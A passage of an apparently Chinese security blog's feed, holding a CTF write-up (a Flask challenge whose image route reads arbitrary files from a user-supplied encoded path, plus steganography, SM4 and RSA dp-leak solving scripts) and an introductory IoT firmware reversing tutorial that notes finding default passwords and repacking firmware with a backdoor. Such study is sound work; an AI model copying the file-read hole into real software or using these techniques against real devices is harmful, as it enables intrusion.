class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index.php')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload.php', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"不允许的格式"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/img.php', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    <span class="keyword">return</span> Response(image, mimetype=<span class="string">"image/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure></p><p>这里有两个trick</p><ol><li>fuzz出文件名的编码关系，这个在挖洞中也会有场景，具体的去wooyun看</li><li><code>/proc/self/cwd/</code> 指向的是当前路径，在本题中用于拼凑3倍数长度的字符串</li></ol><h2 id="0x04-签到题"><a href="#0x04-签到题" class="headerlink" title="0x04 签到题"></a>0x04 签到题</h2><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>I’m gamectf.com, I love TXT.</p><h4 id="题目解答-3"><a href="#题目解答-3" class="headerlink" title="题目解答"></a>题目解答</h4><p>联想到TXT字段，所以直接查到flag</p><p><img src="https://i.loli.net/2019/08/16/vnHfeML3Y7CAWby.png" alt="5A6A112C-D1A1-4244-B5B0-EE9AAF435A01.png"></p><h2 id="0x05-24word"><a href="#0x05-24word" class="headerlink" title="0x05 24word"></a>0x05 24word</h2><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p><h4 id="题目解答-4"><a href="#题目解答-4" class="headerlink" title="题目解答"></a>题目解答</h4><p>打开是一张这样的图片</p><p><img src="https://i.loli.net/2019/08/16/MDjyHYscquJPXnR.png" alt="24w.png"></p><p>binwalk -e 提取出其中的压缩包</p><p>看图联想到社会主义核心价值观加密解密</p><p><a href="https://z.duoluosb.com/" target="_blank" rel="noopener">https://z.duoluosb.com/</a></p><p>自由 和谐 公正 诚信 平等 公正 自由 公正 平等 平等 公正<br>CodeV<br>公正 民主 公正 诚信 文明 法治 平等 公正 平等 法治 和谐<br>alues</p><p>所以得到解压密码: CodeValues</p><p>解压完又一张图，上面带了Data Matrix，微信扫一下得到flag</p><p><img src="https://i.loli.net/2019/08/16/uBVDzZcHSr4JPsd.jpg" alt="24c 2.jpg"></p><h2 id="0x06-七代目"><a href="#0x06-七代目" class="headerlink" title="0x06 七代目"></a>0x06 七代目</h2><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p><h4 id="题目解答-5"><a href="#题目解答-5" class="headerlink" title="题目解答"></a>题目解答</h4><p>打开gif显示文件损坏，使用hex编辑器修改git头得到正常的文件</p><p>然后在下面的网站将图逐帧分解</p><p><a href="https://zh.bloggif.com/gif-extract?id=1e36fc0da9d495cfba235a6590b61ed7" target="_blank" rel="noopener">https://zh.bloggif.com/gif-extract?id=1e36fc0da9d495cfba235a6590b61ed7</a></p><p>最终在第七帧使用stego分析得到flag</p><p><img src="https://i.loli.net/2019/08/16/IBnLsO7uE4GcyNm.png" alt="7BE386FC-9FB2-4057-A121-E3360223E716.png"></p><h2 id="0x07-亚萨西"><a href="#0x07-亚萨西" class="headerlink" title="0x07 亚萨西"></a>0x07 亚萨西</h2><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p><h4 id="题目解答-6"><a href="#题目解答-6" class="headerlink" title="题目解答"></a>题目解答</h4><p>strings命令直接的得到pass<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings yasaxi_45d7d3f89b50ad351e8bc385b591fd80.zip</span><br></pre></td></tr></table></figure></p><p>解压文件夹后是一个图片<br>图片里面有ook编码<br>直接解码得到flag</p><p><img src="https://i.loli.net/2019/08/16/sB5wKuyEYPvilHf.png" alt="57498389-1BD5-40DF-AA1E-D15BCAE51C0B.png"></p><h2 id="0x08-sm4"><a href="#0x08-sm4" class="headerlink" title="0x08 sm4"></a>0x08 sm4</h2><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p><h4 id="题目解答-7"><a href="#题目解答-7" class="headerlink" title="题目解答"></a>题目解答</h4><p><a href="https://github.com/yang3yen/pysm4" target="_blank" rel="noopener">https://github.com/yang3yen/pysm4</a></p><p>国密SM4(无线局域网SMS4)算法， 一个分组算法， 分组长度为128bit， 密钥长度为128bit 所以需要分段解，注意补位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line">key = [<span class="number">13</span>, <span class="number">204</span>, <span class="number">99</span>, <span class="number">177</span>, <span class="number">254</span>, <span class="number">41</span>, <span class="number">198</span>, <span class="number">163</span>, <span class="number">201</span>, <span class="number">226</span>, <span class="number">56</span>, <span class="number">214</span>, <span class="number">192</span>, <span class="number">194</span>, <span class="number">98</span>, <span class="number">104</span>]</span><br><span class="line">c = [<span class="number">46</span>, <span class="number">48</span>, <span class="number">220</span>, <span class="number">156</span>, <span class="number">184</span>, <span class="number">218</span>, <span class="number">57</span>, <span class="number">13</span>, <span class="number">246</span>, <span class="number">91</span>, <span class="number">1</span>, <span class="number">63</span>, <span class="number">60</span>, <span class="number">67</span>, <span class="number">105</span>, <span class="number">64</span>, <span class="number">149</span>, <span class="number">240</span>, <span class="number">217</span>, <span class="number">77</span>, <span class="number">107</span>, <span class="number">49</span>, <span class="number">222</span>, <span class="number">61</span>, <span class="number">155</span>, <span class="number">225</span>, <span class="number">231</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">121</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">60</span>, <span class="number">182</span>, <span class="number">65</span>, <span class="number">101</span>, <span class="number">39</span>, <span class="number">253</span>, <span class="number">250</span>, <span class="number">224</span>, <span class="number">9</span>, <span class="number">204</span>, <span class="number">154</span>, <span class="number">122</span>, <span class="number">206</span>, <span class="number">43</span>, <span class="number">97</span>, <span class="number">59</span>]</span><br><span class="line">tmp =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    <span class="keyword">if</span> len(str(hex(key[i])))&lt;<span class="number">4</span>:</span><br><span class="line">        tmp = tmp + <span class="string">'0'</span>+str(hex(key[i])[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp =tmp  + str(hex(key[i])[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">tmp =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">    <span class="keyword">if</span> len(str(hex(c[i])))&lt;<span class="number">4</span>:</span><br><span class="line">        tmp = tmp + <span class="string">'0'</span>+str(hex(c[i])[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp =tmp  + str(hex(c[i])[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">key =  <span class="number">0x0dcc63b1fe29c6a3c9e238d6c0c26268</span></span><br><span class="line">c1 =   <span class="number">0x2e30dc9cb8da390df65b013f3c436940</span></span><br><span class="line">c2 =   <span class="number">0x95f0d94d6b31de3d9be1e7c4a7790910</span></span><br><span class="line">c3 =   <span class="number">0x3cb6416527fdfae009cc9a7ace2b613b</span></span><br><span class="line"><span class="comment">#2e30dc9cb8da390df65b013f3c436940</span></span><br><span class="line"><span class="comment">#95f0d94d6b31de3d9be1e7c4a7790910</span></span><br><span class="line"><span class="comment">#3cb6416527fdfae009cc9a7ace2b613b</span></span><br><span class="line">clear_num1 = decrypt(c1, key)</span><br><span class="line">clear_num2 = decrypt(c2, key)</span><br><span class="line">clear_num3= decrypt(c3, key)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num1))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num2))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> str(hex(clear_num3))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="0x09-db"><a href="#0x09-db" class="headerlink" title="0x09 db"></a>0x09 db</h2><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><p>try to do.</p><h4 id="题目解答-8"><a href="#题目解答-8" class="headerlink" title="题目解答"></a>题目解答</h4><p>已知N dq 求分解问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">9637571466652899741848142654451413405801976834328667418509217149503238513830870985353918314633160277580591819016181785300521866901536670666234046521697590230079161867282389124998093526637796571100147052430445089605759722456767679930869250538932528092292071024877213105462554819256136145385237821098127348787416199401770954567019811050508888349297579329222552491826770225583983899834347983888473219771888063393354348613119521862989609112706536794212028369088219375364362615622092005578099889045473175051574207130932430162265994221914833343534531743589037146933738549770365029230545884239551015472122598634133661853901</span></span><br><span class="line">dp=<span class="number">81339405704902517676022188908547543689627829453799865550091494842725439570571310071337729038516525539158092247771184675844795891671744082925462138427070614848951224652874430072917346702280925974595608822751382808802457160317381440319175601623719969138918927272712366710634393379149593082774688540571485214097</span></span><br><span class="line">c=<span class="number">5971372776574706905158546698157178098706187597204981662036310534369575915776950962893790809274833462545672702278129839887482283641996814437707885716134279091994238891294614019371247451378504745748882207694219990495603397913371579808848136183106703158532870472345648247817132700604598385677497138485776569096958910782582696229046024695529762572289705021673895852985396416704278321332667281973074372362761992335826576550161390158761314769544548809326036026461123102509831887999493584436939086255411387879202594399181211724444617225689922628790388129032022982596393215038044861544602046137258904612792518629229736324827</span></span><br><span class="line">r = <span class="number">3</span></span><br><span class="line">p = pow(r,e*dp,n)-r%n</span><br><span class="line">p = gmpy2.gcd(n,p)</span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">print</span> n/p</span><br><span class="line">q= <span class="number">97967760714365562093916104858384893828746431642467029585975238084315810021090864458586154529967237614974563846071700091242756496083221705212495652837671370581444579945909265868365865106738889897018594915115133212043327703567935896287234339778667527842604275909693199845318489073853263155905386941710423649313</span></span><br><span class="line">fn = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d= gmpy2.invert(e,fn)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'d='</span>,d</span><br><span class="line">plain= pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, plain</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, hex(plain)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'plain='</span>, hex(plain)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;惨惨惨，速成了一下misc，最后还是21，那个web注入也没解出来&lt;/p&gt;
&lt;h2 id=&quot;0x01
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>IoT固件逆向入门</title>
    <link href="http://zer0yu.github.io/2019/08/15/How_to_start_IoT_Reverse/"/>
    <id>http://zer0yu.github.io/2019/08/15/How_to_start_IoT_Reverse/</id>
    <published>2019-08-15T15:28:48.000Z</published>
    <updated>2019-08-15T15:52:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一篇入门级别的IoT固件逆向文章</p><h2 id="0x01-固件下载"><a href="#0x01-固件下载" class="headerlink" title="0x01 固件下载"></a>0x01 固件下载</h2><ol><li>tp-link 固件下载</li></ol><p><a href="https://www.tp-link.com/in/support/download/" target="_blank" rel="noopener">https://www.tp-link.com/in/support/download/</a></p><p>此外tp-link还提供了在线的仿真环境</p><ol start="2"><li>小米智能家居的环境</li></ol><p><a href="https://github.com/dgiese/dustcloud" target="_blank" rel="noopener">https://github.com/dgiese/dustcloud</a></p><h2 id="0x02-常用工具"><a href="#0x02-常用工具" class="headerlink" title="0x02 常用工具"></a>0x02 常用工具</h2><h3 id="Linux系统自带工具"><a href="#Linux系统自带工具" class="headerlink" title="Linux系统自带工具"></a>Linux系统自带工具</h3><p>file — 用来检测是否是有效的文件和文件类型<br>xxd - 会生成给定文件或者标准输入的十六进制格式，也可以将十六进制格式转换回原始的二进制格式<br>hexdump —16进制导出工具<br>strings 跟hexdump类似但是可以以可读的形式展示<br>dd — 从二进制文件中挖掘数据<br>lzma — 解压LZMA文件</p><h3 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h3><p><a href="https://github.com/radare/radare2" target="_blank" rel="noopener">Radare2</a> - 逆向工程和二进制分析的完整框架<br><a href="https://ghidra-sre.org/" target="_blank" rel="noopener">ghidra</a> - nsa开源的逆向分析工具<br>IDA Pro - 不用多解释的超强逆向分析工具<br><a href="https://github.com/ChrisTheCoolHut/Firmware_Slap" target="_blank" rel="noopener">Firmware_Slap</a> - 使用约束求解和函数聚类自动发现固件中的漏洞<br><a href="https://github.com/craigz28/firmwalker" target="_blank" rel="noopener">firmwalker</a> - 在安装的固件文件系统中搜索敏感的文件<br>binwalk - 通过固件文件头来分析文件和文件系统<br><a href="https://code.google.com/archive/p/firmware-mod-kit" target="_blank" rel="noopener">Fireware Mod Kit</a> — 自动化分析固件文件的一系列脚本<br><a href="http://www.tldp.org/HOWTO/SquashFS-HOWTO/mksqoverview.html" target="_blank" rel="noopener">squashfs-tools</a>— 可以通过apt-get squashfs-tools 来安装。用来处理squashfs的一系列工具</p><h2 id="0x03-分析示例"><a href="#0x03-分析示例" class="headerlink" title="0x03 分析示例"></a>0x03 分析示例</h2><p>此处下载固件 <a href="https://static.tp-link.com/2018/201804/20180403/TL-WR841N%28EU%29_V14_180319.zip" target="_blank" rel="noopener">TL-WR841N(EU)_V14_180319</a></p><p>下载之后解压文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip TL-WR841N\(EU\)_V14_180319.zip</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/15/8c7qXriJG5KaIpT.png" alt="B10BD5C0-8820-49A2-ABC1-EA4BF20150C0.png"></p><p>之后使用使用<code>file</code>命令来识别文件类型，此处识别后发现目标是数据类文件<br><img src="https://i.loli.net/2019/08/15/S3qQ4kJAwXdsjUO.png" alt="CD422AAB-9C09-46DD-BD27-C56273444ADB.png"></p><p>既然是数据文件我们就可以使用<code>hexdump</code>和<code>string</code>来对其中的信息进行分析，作为初始的信息收集过程。<br>PS: </p><ol><li>因为一般输出的信息非常多，所以此处将输出的信息导入输出文件，方便随后查看。</li><li>hexdump -C 参数可以设置输出为hex+ASCII的方式。</li></ol><p><img src="https://i.loli.net/2019/08/15/7WlOTnQR8AyNdMx.png" alt="9A44A5CB-CAA3-462C-A15A-7EB5A423E0DF.png"></p><p>之后就可以在文件中搜索自己想要的信息，比如搜索一下文件系统常用的boot loader名字u-boot，就可以在文件中看到相关信息。<br><img src="https://i.loli.net/2019/08/15/kbNPFCHh5A4sqmd.png" alt="C8AB21C5-BC26-46F7-9A50-AC6A099BC222.png"></p><p>之后可以使用<code>binwalk</code>来对目标进行分析。分析结果主要分为三个部分进行展示：文件地址的十进制和十六进制展示以及对应位置发现的详细描述。从分析结果中也可以确认此处使用的boot loader就是U-boot。<br><img src="https://i.loli.net/2019/08/15/R7yL2DPpV4rg6Nx.png" alt="21E84A59-EB8C-4469-BA57-8C5E1F1706A2.png"></p><p>分析完之后可以使用<code>binwalk -e</code>来对固件的各个部分进行提取。提取完成后就可以进入文件系统获取自己想要的信息了，比如我只关注web页面的源码文件，那么就进入<code>squashfs-root/web</code>。<br><img src="https://i.loli.net/2019/08/15/hUH1M6XyCNT8zWr.png" alt="1A6B56C2-CA38-4618-8B35-4DFB05F9A6F2.png"></p><p>PS: binwalk其它的常用参数<br>-M：递归扫描提取的文件<br>-r：提取后删除剩余文件<br>-e：自动提取已知文件类型<br>所以一般会使用<code>binwalk -Mre file.bin</code>来提取固件中的信息。</p><p>当然此处也可以使用<code>dd</code>命令来对特定位置的文件来提取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=TL-WR841Nv14_EU_0.9.1_4.16_up_boot\[180319-rel57291\].bin skip=1049088 bs=1 of=TP.sfs</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/15/v4OMKBoNeczHWE1.png" alt="B25D6B9F-1B47-42F0-8BAC-1B630954E8E0.png"><br>PS: </p><ol><li><code>dd</code> 可以跨文件、设备、分区和卷复制数据</li><li><code>if</code> 标准文件输入</li><li><code>of</code> 标准文件输出</li><li><code>bs</code> 块大小</li><li><code>skip</code>用于跳过指向固件二进制映像中特定地址的指针</li></ol><p>最终得到<code>dd</code>命令分割之后的文件<code>TP.sfs</code>，这是一个存储<code>Squashfs</code>文件系统的文件。之后可以使用<code>unsquashfs</code>工具来对其中的文件系统进行提取。提取完成后会自动创建一个<code>squashfs-root</code>文件夹。<br><img src="https://i.loli.net/2019/08/15/N9hKyCWLUTtM85k.png" alt="A08A2109-0C9F-4C3E-86FA-A23D0A678977.png"></p><p>此外，我们还可以使用Google出的firmware-mod-kit来完成对固件的解包和打包，这样我们就可以很方便的在对目标完成修改后重新打包固件（比如植入后门之后重新打包）。<br>PS: Google已经不对这个工具进行更新，在最新的系统上编译可能会出现问题，所以推荐以下两个第三方修改版。<br>适用于Linux: <a href="https://github.com/rampageX/firmware-mod-kit" target="_blank" rel="noopener">https://github.com/rampageX/firmware-mod-kit</a><br>适用于macOS: <a href="https://github.com/cinquemb/firmware-mod-kit-osx" target="_blank" rel="noopener">https://github.com/cinquemb/firmware-mod-kit-osx</a><br>解包操作如下所示<br><img src="https://i.loli.net/2019/08/15/jR76ACzO9EuFe2c.png" alt="EA859A97-35DE-4C7D-8013-C6F4F07FB24B.png"><br>重建固件包如下所示<br><img src="https://i.loli.net/2019/08/15/lxCqDMjnITHvzYE.png" alt="FAAC8614-47CF-41F6-BD2A-293E3AAAC0F7.png"></p><p>到此为止，我们已经提取了固件的整个文件系统，现在我们可以开始分析文件系统中存在的二进制文件或者某些文件了。</p><p>分析文件的话一般是先看<code>etc</code>目录下的配置文件和启动脚本<br><img src="https://i.loli.net/2019/08/15/rwylY95RsaLoQj7.png" alt="B4DD20FF-8797-4633-9540-C1F57C2D2700.png"><br>比如说此处可以看到一个passwd文件和init.d文件夹，init.d文件夹下存储的是启动的时候初始化服务和环境rcS文件，可以看一下文件的内容。<br><img src="https://i.loli.net/2019/08/15/l3ToSLJOeia69Fu.png" alt="909A5DC6-5F72-467D-92E5-24F1C12F7C25.png"><br>可以看到启动的时候将<code>cp -p /etc/passwd.bak /var/passwd</code>，再看<code>passwd.bak</code>文件就可以得到一些默认口令<br><img src="https://i.loli.net/2019/08/15/7ztHWvsGeiSK8Xb.png" alt="4CB3F00A-6E9D-4120-BCC3-F038026F0988.png"></p><p>之后在bin目录下看到<code>login</code>文件，可以使用IDA来对这个文件的登录逻辑进行分析，可能存在登录绕过或者命令注入等漏洞。</p><p><img src="https://i.loli.net/2019/08/15/xRJOp6InTN5Lvmb.png" alt="6E87135C-D407-4D8E-AD80-DE25BBED2EA3.png"></p><p>不过再对mips指令集的分析上ghidra更好一些<br><img src="https://i.loli.net/2019/08/15/jfi6T8nJeFt2DhW.png" alt="1C720AAD-26F9-492A-AFDD-E00F3B91F2EB.png"></p><h2 id="0x04-trick"><a href="#0x04-trick" class="headerlink" title="0x04 trick"></a>0x04 trick</h2><ol><li>在整个二进制文件中搜索字符串<br>参数<code>izz | more</code><br><img src="https://i.loli.net/2019/08/15/eJlpzdSnKgACO5Y.png" alt="47BCD0CA-59D7-4A3E-806A-1A5346F7BCB4.png"></li><li>使用firmwalker扫描敏感文件<br><img src="https://i.loli.net/2019/08/15/mjLT1aRCBihfyuQ.png" alt="98B7ADDE-2020-44AA-AFB2-AB437AF3E899.png"></li><li>使用Firmware Slap扫描漏洞</li></ol><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>文章对目前常用的固件分析工具以及固件的分析流程做了简单的介绍，作为一篇入门级别的文章。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://blog.securelayer7.net/how-to-start-iot-device-firmware-reverse-engineering/" target="_blank" rel="noopener">《How to Start IoT device Firmware Reverse Engineering?》</a><br><a href="https://yq.aliyun.com/articles/572095" target="_blank" rel="noopener">《逆向路由器固件之解包 Part1》</a><br><a href="https://www.zkaq.org/?t/1815.html" target="_blank" rel="noopener">《IOT渗透测试》</a><br><a href="http://xdxd.love/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BA%8C/" target="_blank" rel="noopener">《逆向路由器固件之信息泄露》</a><br><a href="http://www.atomsec.org/%e5%ae%89%e5%85%a8/multiple-d-link-authentication-bypass-vulnerabilities/" target="_blank" rel="noopener">《Multiple D-Link Authentication Bypass Vulnerabilities》</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;一篇入门级别的IoT固件逆向文章&lt;/p&gt;
&lt;h2 id=&quot;0x01-固件下载&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CyBRICS CTF 2019 WriteUp</title>
    <link href="http://zer0yu.github.io/2019/08/11/CyBRICS-CTF-2019-WriteUp/"/>
    <id>http://zer0yu.github.io/2019/08/11/CyBRICS-CTF-2019-WriteUp/</id>
    <published>2019-08-11T11:11:26.000Z</published>
    <updated>2019-08-11T11:15:10.000Z</updated>
    
